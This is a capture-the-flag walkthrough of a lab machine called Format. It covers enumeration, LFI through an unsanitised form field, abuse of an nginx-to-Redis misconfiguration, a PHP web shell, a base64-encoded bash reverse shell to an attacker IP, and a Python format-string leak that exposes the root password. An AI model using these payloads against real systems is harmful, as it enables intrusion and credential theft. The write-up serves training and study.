# Format:

## Enumeration:

Start off with an NMAP scan:
```vim
Host is up (0.21s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c3:97:ce:83:7d:25:5d:5d:ed:b5:45:cd:f2:0b:05:4f (RSA)
|   256 b3:aa:30:35:2b:99:7d:20:fe:b6:75:88:40:a5:17:c1 (ECDSA)
|_  256 fa:b3:7d:6e:1a:bc:d1:4b:68:ed:d6:e8:97:67:27:d7 (ED25519)
80/tcp   open  http    nginx 1.18.0
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0
3000/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://microblog.htb:3000/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The scan leaks the `microblog.htb` domain name. Visiting the HTTP port leads us to the `app.microblog.htb` subdomain. Port 3000 has a Gitea instance.

Looking at the Webapp, there is a link to the Gitea instance which leads us to the Microblog repository. This repository hosts the source code of the Webapp, saving us a lot of enumeration. 

The Webapp lets you register an account and then make a subdomain where you can edit it to add text and headers. The Webapp also hints at a Pro version but that seems unavailable at the moment.

## Exploit:

Looking at the source code, there are various things which seem to pop out:
- The Webapp is using Redis as a backend in order to store user information and credentials
- The Pro version seems to have access to the `uploads` subdirectory of the subdomain and allows you to upload images (These images are uploaded via BulletProof)
- When adding information to the Webapp owned by a user, it creates a file containing the text/header/image under a `content` directory. It also contains an `order.txt` file containing the list of all files created which is used to reference each file.

Looking at how the user is registered, we see this:
```php
$redis = new Redis();
$redis->connect('/var/run/redis/redis.sock');
$redis->HSET(trim($_POST['username']), "username", trim($_POST['username']));
$redis->HSET(trim($_POST['username']), "password", trim($_POST['password']));
$redis->HSET(trim($_POST['username']), "first-name", trim($_POST['first-name']));
$redis->HSET(trim($_POST['username']), "last-name", trim($_POST['last-name']));
$redis->HSET(trim($_POST['username']), "pro", "false");
```

We can see that the Webapp hardcodes the the Pro feature as `false`.

Looking into the `microblog/microblog-template/edit/index.php` file:
```php
#add text
if (isset($_POST['txt']) && isset($_POST['id'])) {
    chdir(getcwd() . "/../content");
    $txt_nl = nl2br($_POST['txt']);
    $html = "<div class = \"blog-text\">{$txt_nl}</div>";
    $post_file = fopen("{$_POST['id']}", "w");
    fwrite($post_file, $html);
    fclose($post_file);
    $order_file = fopen("order.txt", "a");
    fwrite($order_file, $_POST['id'] . "\n");  
    fclose($order_file);
    header("Location: /edit?message=Section added!&status=success");
}

...

function fetchPage() {
    chdir(getcwd() . "/../content");
    $order = file("order.txt", FILE_IGNORE_NEW_LINES);
    $html_content = "";
    foreach($order as $line) {
        $temp = $html_content;
        $html_content = $temp . "<div class = \"{$line} blog-indiv-content\">" . file_get_contents($line) . "</div>";
    }
    return $html_content;
}
```

There is no input sanitization in the `id` field being submitted in the POST request. This allows LFI to be achieved as we can add something like `/etc/passwd` to `id` and since this gets saved and referenced by `order.txt`, this allows for the contents of the file to be displayed on the main page.

Not only this, but since adding text uses `fopen` this means that we can also create new files and add content to them. However since we do not have access to the `uploads` subdirectory, we will have to figure out how to get the Pro version.

You can use something like the following HTTP request to get LFI:

```http
POST /edit/index.php HTTP/1.1
Host: lmao.microblog.htb
Content-Length: 19
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://lmao.microblog.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://lmao.microblog.htb/edit/?message=Section%20deleted&status=success
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: username=imkpc5igeei3e4f68jkkhnk13p
Connection: close

id=/etc/passwd&txt=
```

I looked for the nginx config file and I found the following in `/etc/nginx/sites-available/default`:

```
##
# You should look at the following URL's in order to grasp a solid understanding
# of Nginx configuration files in order to fully unleash the power of Nginx.
# https://www.nginx.com/resources/wiki/start/
# https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/
# https://wiki.debian.org/Nginx/DirectoryStructure
#
# In most cases, administrators will remove this file from sites-enabled/ and
# leave it as reference inside of sites-available where it will continue to be
# updated by the nginx packaging team.
#
# This file will automatically load configuration files provided by other
# applications, such as Drupal or Wordpress. These applications will be made
# available underneath a path with that package name, such as /drupal8.
#
# Please see /usr/share/doc/nginx-doc/examples/ for more detailed examples.
##

# Default server configuration
#
server {
        listen 80 default_server;
        listen [::]:80 default_server;

        # SSL configuration
        #
        # listen 443 ssl default_server;
        # listen [::]:443 ssl default_server;
        #
        # Note: You should disable gzip for SSL traffic.
        # See: https://bugs.debian.org/773332
        #
        # Read up on ssl_ciphers to ensure a secure configuration.
        # See: https://bugs.debian.org/765782
        #
        # Self signed certs generated by the ssl-cert package
        # Don't use them in a production server!
        #
        # include snippets/snakeoil.conf;

        root /var/www/html;

        # Add index.php to the list if you are using PHP
        index index.html index.htm index.nginx-debian.html;

        server_name _;

        location / {
                # First attempt to serve request as file, then
                # as directory, then fall back to displaying a 404.
                try_files $uri $uri/ =404;
        }

        # pass PHP scripts to FastCGI server
        #
        #location ~ .php$ {
        #       include snippets/fastcgi-php.conf;
        #
        #       # With php-fpm (or other unix sockets):
        #       fastcgi_pass unix:/run/php/php7.4-fpm.sock;
        #       # With php-cgi (or other tcp sockets):
        #       fastcgi_pass 127.0.0.1:9000;
        #}

        # deny access to .htaccess files, if Apache's document root
        # concurs with nginx's one
        #
        #location ~ /.ht {
        #       deny all;
        #}
}

server {
        listen 80;
        listen [::]:80;

        root /var/www/microblog/app;

        index index.html index.htm index-nginx-debian.html;

        server_name microblog.htb;

        location / {
                return 404;
        }

        location = /static/css/health/ {
                resolver 127.0.0.1;
                proxy_pass http://css.microbucket.htb/health.txt;
        }

        location = /static/js/health/ {
                resolver 127.0.0.1;
                proxy_pass http://js.microbucket.htb/health.txt;
        }

        location ~ /static/(.*)/(.*) {
                resolver 127.0.0.1;
                proxy_pass http://$1.microbucket.htb/$2;
        }
}
```

I could see that this did have some form of weird config, especially the last one with the `/static`, however I did not get too much information off of this and decided to looking for something more to work with. To add onto this, the way that redis was being accessed was via a UNIX socket rather an a port, so this had to be relevant somehow.

While looking for a way to access redis via sockets, I came across this following article: https://prog.world/continuation-frequent-errors-in-nginx-settings-due-to-which-the-web-server-becomes-vulnerable/

The article talks about how the above `/static` route is a misconfiguration allowing for commands to be passed directly to redis via HTTP requests like the following:

```vim
curl -X "HSET" http://microblog.htb/static/unix:/var/run/redis/redis.sock:<USERNAME>%20pro%20true%20/abc
```

We can confirm this works on reload of the `app.microblog.htb` page which shows that we are a Pro user.

We can now change our exploit from earlier to be something like this:

```http
POST /edit/index.php HTTP/1.1
Host: lmao.microblog.htb
Content-Length: 42
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://lmao.microblog.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://lmao.microblog.htb/edit/?message=Section%20deleted&status=success
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: username=imkpc5igeei3e4f68jkkhnk13p
Connection: close

id=/var/www/microblog/lmao/uploads/rev.php&txt=%3c%3fphp%20system(%24_REQUEST%5b'cmd'%5d)%3b%3f%3e
```

Going to `/uploads/rev.php?cmd=id` will prove that the reverse shell is working.

I use the following payload as a POST request to get a reverse shell (Just a base64 encoded bash reverse shell being decoded and executed): `echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMS85MDAwIDA+JjEn | base64 -d | bash`

After getting a shell and doing an upgrade, I do `redis-cli -s /var/run/redis/redis.sock` to connect to the redis server:

```vim
www-data@format:~/microblog/lmao/uploads$ redis-cli -s /var/run/redis/redis.sock
redis /var/run/redis/redis.sock> keys *
1) "PHPREDIS_SESSION:imkpc5igeei3e4f68jkkhnk13p"
2) "cooper.dooper"
3) "cooper.dooper:sites"
4) "lmao"
5) "lmao:sites"
redis /var/run/redis/redis.sock> hget cooper.dooper password
"zooperdoopercooper"
```

This reveals the password `zooperdoopercooper` for the user `cooper` allowing us to `su cooper` or get a SSH shell.

User Flag can be found in `/home/cooper/user.txt`

## Privilege Escalation:

Running a little manual enumeration, we can find out the following:
```vim
cooper@format:~$ sudo -l
[sudo] password for cooper: 
Matching Defaults entries for cooper on format:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cooper may run the following commands on format:
    (root) /usr/bin/license
cooper@format:~$ ls -la /usr/bin/license
-rwxr-xr-x 1 root root 3519 Nov  3  2022 /usr/bin/license
cooper@format:~$ file /usr/bin/license
/usr/bin/license: Python script, ASCII text executable
```

We can run the python file `/usr/bin/license` as sudo, looking into the file, we see the following:

```python
#!/usr/bin/python3

import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet
import random
import string
from datetime import date
import redis
import argparse
import os
import sys

class License():
    def __init__(self):
        chars = string.ascii_letters + string.digits + string.punctuation
        self.license = ''.join(random.choice(chars) for i in range(40))
        self.created = date.today()

if os.geteuid() != 0:
    print("")
    print("Microblog license key manager can only be run as root")
    print("")
    sys.exit()

parser = argparse.ArgumentParser(description='Microblog license key manager')
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('-p', '--provision', help='Provision license key for specified user', metavar='username')
group.add_argument('-d', '--deprovision', help='Deprovision license key for specified user', metavar='username')
group.add_argument('-c', '--check', help='Check if specified license key is valid', metavar='license_key')
args = parser.parse_args()

r = redis.Redis(unix_socket_path='/var/run/redis/redis.sock')

secret = [line.strip() for line in open("/root/license/secret")][0]
secret_encoded = secret.encode()
salt = b'microblogsalt123'
kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=32,salt=salt,iterations=100000,backend=default_backend())
encryption_key = base64.urlsafe_b64encode(kdf.derive(secret_encoded))

f = Fernet(encryption_key)
l = License()

#provision
if(args.provision):
    user_profile = r.hgetall(args.provision)
    if not user_profile:
        print("")
        print("User does not exist. Please provide valid username.")
        print("")
        sys.exit()
    existing_keys = open("/root/license/keys", "r")
    all_keys = existing_keys.readlines()
    for user_key in all_keys:
        if(user_key.split(":")[0] == args.provision):
            print("")
            print("License key has already been provisioned for this user")
            print("")
            sys.exit()
    prefix = "microblog"
    username = r.hget(args.provision, "username").decode()
    firstlast = r.hget(args.provision, "first-name").decode() + r.hget(args.provision, "last-name").decode()
    license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)
    print("")
    print("Plaintext license key:")
    print("------------------------------------------------------")
    print(license_key)
    print("")
    license_key_encoded = license_key.encode()
    license_key_encrypted = f.encrypt(license_key_encoded)
    print("Encrypted license key (distribute to customer):")
    print("------------------------------------------------------")
    print(license_key_encrypted.decode())
    print("")
    with open("/root/license/keys", "a") as license_keys_file:
        license_keys_file.write(args.provision + ":" + license_key_encrypted.decode() + "\n")

#deprovision
if(args.deprovision):
    print("")
    print("License key deprovisioning coming soon")
    print("")
    sys.exit()

#check
if(args.check):
    print("")
    try:
        license_key_decrypted = f.decrypt(args.check.encode())
        print("License key valid! Decrypted value:")
        print("------------------------------------------------------")
        print(license_key_decrypted.decode())
    except:
        print("License key invalid")
    print("")

```

Looking at this code, we can see that this is a license key manager script which will take the username as input, read information like `first-name` and `last-name` from it and then generate a plaintext and an encoded license key. The license key can also be validated via the secret and the salt used to encrypt the license key.

Looking at this code, we notice that we have control over 3 variables (username, first-name, last-name) and all 3 of them get processed together in a `format` method. This [article](https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/) from Geeksforgeeks shows how the `format` method is vulnerable and can be used to access object's attributes.

With this information, we can craft the following payload to add to redis: `{license.__init__.__globals__}`

```vim
cooper@format:~$ redis-cli -s /var/run/redis/redis.sock
redis /var/run/redis/redis.sock> hset a username {license.__init__.__globals__}
(integer) 1
redis /var/run/redis/redis.sock> hset a first-name a
(integer) 1
redis /var/run/redis/redis.sock> hset a last-name a
(integer) 1
redis /var/run/redis/redis.sock> exit

cooper@format:~$ sudo /usr/bin/license -p a

Plaintext license key:
------------------------------------------------------
microblog{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f96290d7c10>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/usr/bin/license', '__cached__': None, 'base64': <module 'base64' from '/usr/lib/python3.9/base64.py'>, 'default_backend': <function default_backend at 0x7f9628f2a430>, 'hashes': <module 'cryptography.hazmat.primitives.hashes' from '/usr/local/lib/python3.9/dist-packages/cryptography/hazmat/primitives/hashes.py'>, 'PBKDF2HMAC': <class 'cryptography.hazmat.primitives.kdf.pbkdf2.PBKDF2HMAC'>, 'Fernet': <class 'cryptography.fernet.Fernet'>, 'random': <module 'random' from '/usr/lib/python3.9/random.py'>, 'string': <module 'string' from '/usr/lib/python3.9/string.py'>, 'date': <class 'datetime.date'>, 'redis': <module 'redis' from '/usr/local/lib/python3.9/dist-packages/redis/__init__.py'>, 'argparse': <module 'argparse' from '/usr/lib/python3.9/argparse.py'>, 'os': <module 'os' from '/usr/lib/python3.9/os.py'>, 'sys': <module 'sys' (built-in)>, 'License': <class '__main__.License'>, 'parser': ArgumentParser(prog='license', usage=None, description='Microblog license key manager', formatter_class=<class 'argparse.HelpFormatter'>, conflict_handler='error', add_help=True), 'group': <argparse._MutuallyExclusiveGroup object at 0x7f9627ad07c0>, 'args': Namespace(provision='a', deprovision=None, check=None), 'r': Redis<ConnectionPool<UnixDomainSocketConnection<path=/var/run/redis/redis.sock,db=0>>>, '__warningregistry__': {'version': 0}, 'secret': 'unCR4ckaBL3Pa$$w0rd', 'secret_encoded': b'unCR4ckaBL3Pa$$w0rd', 'salt': b'microblogsalt123', 'kdf': <cryptography.hazmat.primitives.kdf.pbkdf2.PBKDF2HMAC object at 0x7f9627ad0e50>, 'encryption_key': b'nTXlHnzf-z2cR0ADCHOrYga7--k6Ii6BTUKhwmTHOjU=', 'f': <cryptography.fernet.Fernet object at 0x7f9627af55e0>, 'l': <__main__.License object at 0x7f9627af56d0>, 'user_profile': {b'username': b'{license.__init__.__globals__}', b'first-name': b'a', b'last-name': b'a'}, 'existing_keys': <_io.TextIOWrapper name='/root/license/keys' mode='r' encoding='UTF-8'>, 'all_keys': ['cooper.dooper:gAAAAABjZbN1xCOUaNCV_-Q12BxI7uhvmqTGgwN12tB7Krb5avX5JdSzE2dLKX53ZpHxHrzpNnAwQ6g1FTduOtBAl4QYRWF27A2MPfedfMzgNZrv_VqUwCAfzGZeoQCv1-NBIw6GaoCA0yIMPl0o3B6A2_Hads32AsdDzOLyhetqrr8HUgtLbZg=\n'], 'user_key': 'cooper.dooper:gAAAAABjZbN1xCOUaNCV_-Q12BxI7uhvmqTGgwN12tB7Krb5avX5JdSzE2dLKX53ZpHxHrzpNnAwQ6g1FTduOtBAl4QYRWF27A2MPfedfMzgNZrv_VqUwCAfzGZeoQCv1-NBIw6GaoCA0yIMPl0o3B6A2_Hads32AsdDzOLyhetqrr8HUgtLbZg=\n', 'prefix': 'microblog', 'username': '{license.__init__.__globals__}', 'firstlast': 'aa'}sfcx!L9cg-`9Y$S%S,8G?J%C_<VX-=|)vk|N3B'Daa

Encrypted license key (distribute to customer):
------------------------------------------------------
gAAAAABksa1HGZ3z5LvtYoOByYDU_maQ8REzjCguUt49teNbKw7vdpLq0WvE_YQb5IRpMHwS_-ZPpP9g9lxMottfIR3Spv8h8okiYDiwmy4BBnEHaXPhbRU5LtlxrDDXsM6b2ZqYMrzjdf1pmmoe-c2x1WTNFscTIXP4m-k-JfhSZj5Tj21iterWYoncGP9gHabj-dCR7jAxeO5TC7AraJqi5_2mnuBUdqJAmsbItB0K86kcX3Gdsty1GDQC2zmgRObjyyvOias7KMJQGiNo6oYf0AXRT0MQ4IkZXfXeHLKh0czcjoUJJyuk--bCzPlzH06E1gkwZARi6brCmR-siqroCJn7KVyL3z_MRqSzcgCKg3X1CWhbTDzFRod_MiPai02j3OV5cICJeoXH6EOOUWGNnvImffh7WmHXgGZWoR5G2BIjWaxmyvwVWn2hz_vvixSm2nWFliFJSIJavAQ_YJsvL6nIlHPPWAEER2GaQ1wMMfRzPUpPX4DBdUYM4EjTmQiNyuKKuALtbc-gG_aOodXJXR2ODln8ZcG2O_rajqJzclwWuOt2Fh3-3liJ6Lb8eFcPB_h5HxFFPvfibGO_ZQfbv-RaliE8vqWLieho0trHY5vYddUDT3Zxnd9DSf34RUtEkBWJXPiIM_f-g6hhpFBuloBmIIeOzdrnx6HIsU2HyQ8KsL4mcQdvxuE4Aw68vmZgntjiUQOLtkpOuJoY-8HU3WWNA-0wLlCmOaJPpyXnIxl6HaLxcVyUZ22EwOHmvHrRtF6Nqpjq1OlpscIQEIli5hpOgasivoT2NDDXhM3xPtEv1H5p0PNGZ9hTHQO9NqjJKZlKEKU79jm6CgESa1GoUH0gzTGq6OPyDDb6XMqBtjbTd_5pOqaVeqgwJYTlV-ZpEFOu1dtQ7S1CtG6lQOd7_2ZntoDeTv9KX9sZn1tIuAy4ksPdD2qlXUL60W4XovuZI5oISGuY_d4SmKT2JXPGDaGh6puwg5z_eyKhKjClEH8WNtcmEaklt7KHAhVNB8MnqR-F6aoCrfhm4_q14LQGgWjWdsXroXzUuxB_e4OaA8gxM31bS5FamYhFd7ojzfC6IXAR9TuqTj3K1I1nQm4vg8x0enBlgSAMyfznRKm7IlUrPIy7knQkWsHj--oiGk8GKMZJ4Nb2XwpaEuPrzHorvTwOBV-jaxNmvp1uBiEXS67alx3zzD-vw9T9nz7b8WQxHsJqi_rSrE3vFTOhSWSWgs3fGiFT5jy807ypHT8LvuxI1MD839GWVNTzsKNLFMl3qATJdFDft6mkwukMLzAFX39us2Em-pclLk0MKYXOsAyLo_VXf-ZwsiQiXGudE-jHDJCQk4VCiJFY_Na_NQEHdncyE41FH18sjNapuScFW81xB_3jittdmzFuZ7q6R45VLGuuPZR0OKwu9z9xoDEQlVf1HeuxVwtl83FoBV1PpCuR7Cz4WS4_vtIrWfpaNe_fWxPJmiUYCIswVU0CKHKUthXS3cvVq_-ivI1fqph4wthU5et8_ycbh7TZqCYfbvZyU3eolGVxMoV7IlIs2wJ9yiRXQ1y6wq0qpCvBsmYfQnuAXbka6tdvehbQAg5yoshQMALwwjprGvwCIlo0IgLJTGLQ3IkYD2Ywp207MdI5AjTm27SHtDdv_RJBP8GNyE-7Inp8CJxhWU6AMgXLHcma79GASMOkaJQIyC2t63tuVchZDCaeMlzTLDwwVRzaqM2nlTn2SeEFEZHSUoq_x_1uxN032VRCV4PLxPR95CMLG7SV9xHujIWnwK7_dfM8_xGGowLlXQWUx_kNfx3oWy6LBi0W9AUiu2ysL39fEAdTuRV1i1ligftNzMfa2L7qbSuWs7rLr5CT9iH89LlqUI18J9kZrZ-cx2UgTrCUGfGNRQ_b09t3aHSbt2gme1NZO7RJmEsKe75RzQtiWMWJ9zjc1bJWtM5vGZN0gbA_N1RI9aQdU3FenkWRR8OHxvkqtCl87jvc-r0etLjyctMhv3yXIOEl0q2TuJgxEZV2k7Wd8t5i_1NYHtcW1u1vT5koMRXD4BX4F_dJfm0Zbc9WYh_Ev6ccq2Gu8f7h0r_djKFCf2S8fTxoW-fO1CVT96i4fqJw7qZAc0RD2EHR4_84eUpP-kYxruGvZ5Hc0Sp8LEyqnladBzd5bm3I4vKPLMsFP2_T0IFUhko0Cy1qBZiqAfkHI5BPa9UNCaRKmeemh9PWTBv2EgWA10WM4pKqTldTdh11hcjva00vQz_N7FLjgeeCHFGU32M3inzoBRzXp0Q9F6xGBq8A-oWQw_35wUPmtSIWtreHx389zqNESNyCmmNgD0rqkOiIp494gqIWngMzN6QcSg1n3jMhUPZO-8HohysIHupXbvy2ragr43QiJCyE_P0dkXlIgmViz8jFYiyAL_6kD5JpsZlm3oouOUNNfcoFwWTSJYPE3_F1PZwSZn3xMzcwVk7axXH3ETI8IjmbCpdLiRcZaXhGQobs3X4HmNl5EQGQd354CxoxBxaI28RODmYZqvUmm1BtifR0i5WJ2BH4uOqjJGAt5qb4-2O5V1HaEZEvXmV1HYivEhqwolkXPRrj95hECV3Ku2wJIDQhU_dmQ6_FdeXn4KFUV2xItFH-gNiaEl4SChd268jj4vGXck2pVJJ5x5ykv3v9Yeu4U5qDH496h0M64oGPgGpK7XkQIVGkmiSqSh8EtmE2ciNEWaznuw-QE7r20JvETRDsOvA-AQuknEEwdTcvBUhs4of_9vuUFtQ3_1Gn7MXGwJGOp04tH2Qnuch7tO22YL-xmC0gJbBqCK-7ARL8eHSxLaUY7k6gKTafYP1vSP8kX0I--ROHS1j2aRb_kKxe6eZrh5czkmzVfUzh4bvp8Qgd27b4EWEbaHfChw3NA0EQq7HxgV4Wt__SaLpjWkYTiyPdi0840BCjpFfXldVqug0brQDcHcjVvglyz5V_Hor8viZy2QflWV3eD77o1yhPbiV9uNqqfarLNlowLlsT2Y9kWw87H5f8x2XJraGe8GJEIh6bsJmk2n_RvOwhicTTWaFLK9hIEuXnmdYQT2jx5uSmIv9jfq0Bl6zxyDvlLUbRgx62eEahSSlhX8iL-OysMimVzZD8DJ3yJgSNFAq34ENXEW2wr0udYeKeacvUsCyFHvkUvXTlmfExm1esfY9FlGwp2Go0PpYJ7tdMzOLuT-ccgjeWzXoEuFtQBupWTXxhlDf2s5Y_T146jvIpN2GEhC7RM4UFzJ77_d-N_6fhg2NPA-ALRIWgeph_BWfUhvvsHOAG81pomz0lNShIC1VmEUqwDCGNAg0OXyOIytAwrlK_rPv4vdXYNDijBPcMgRQX4bMw0M9vToiDewGBQp-GXTtylkdvhvRkc2oze4Le7N-yLCl0Htjb9_Qw_hD1yI_UyPkC8WJDopJa4abxrA26c3HZiE3ynSBa5ecrceKXvQjvVOmijNmRxMANwvK-N5QMVxNCQsVrLbcRQfatcKIHAEM2ozG5_FdTr1qy7-RMd9M35qRd5Bt3wlQsajmqouvJbhZGnhGZ-Gwy8wB-30SElEfISnI1d2Gg2sJNOowcqcgOJa5QpYh_PD0QIByOa8kR6hCbMtvuIhRmtkTL0T1sgItdhBLevjlb7KKKoyO0f3YEWq0o1UEtlZ05Fk2Phej-Clb7T6LOvG1uvaXeXdJTuGSHp8gZYnUrc5mPxsWK8Zy6sjtygsam6MvXK_qJF0ywGu5zeQUbk7cupg==
```

In the above, we can see the secret as `unCR4ckaBL3Pa$$w0rd`, This is the password for root.

Root flag can be found in `/root/root.txt`
